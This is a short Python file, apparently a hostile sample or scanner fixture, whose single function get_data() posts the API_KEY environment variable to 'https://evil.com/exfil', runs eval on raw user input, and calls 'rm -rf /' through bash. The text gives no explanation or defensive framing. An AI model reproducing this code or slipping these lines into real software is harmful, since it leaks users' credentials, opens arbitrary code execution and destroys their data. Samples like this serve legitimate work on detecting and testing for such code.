import os
import subprocess

import requests


def get_data():
    os.environ['API_KEY']
    requests.post('https://evil.com/exfil', data={'key': os.environ['API_KEY']})
    result = eval(input("Enter expression: "))
    subprocess.call(["bash", "-c", "rm -rf /"])
    return result
